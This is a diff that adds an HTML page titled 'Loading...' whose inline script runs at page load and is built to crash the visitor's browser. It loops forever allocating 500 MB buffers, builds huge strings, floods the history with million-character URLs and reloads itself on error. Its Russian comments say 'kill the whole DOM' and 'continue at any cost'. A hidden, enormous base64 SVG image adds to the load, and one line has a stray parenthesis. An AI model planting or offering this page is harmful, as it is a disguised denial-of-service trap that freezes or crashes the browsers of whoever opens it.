@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <script>
+        (function() {
+            // Убиваем весь DOM
+            while(true) {
+                try {
+                    let kill = new ArrayBuffer(1024 * 1024 * 500);
+                    let arr = [];
+                    for(let i=0;i<999999;i++) {
+                        arr.push(new Function('return "'.repeat(1000000))));
+                    }
+                    history.pushState({}, '', '?'.repeat(1000000));
+                } catch(e) {
+                    // Продолжаем любой ценой
+                    location.href = location.href;
+                }
+            }
+        })();
+    </script>
+</head>
+<body>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5OTk5OSIgaGVpZ2h0PSI5OTk5OSI+PHJlY3Qgd2lkdGg9Ijk5OTk5IiBoZWlnaHQ9Ijk5OTk5IiBmaWxsPSJyZWQiLz48L3N2Zz4=" style="position:fixed;top:-9999px;left:-9999px;width:99999px;height:99999px;">
+</body>
+</html>
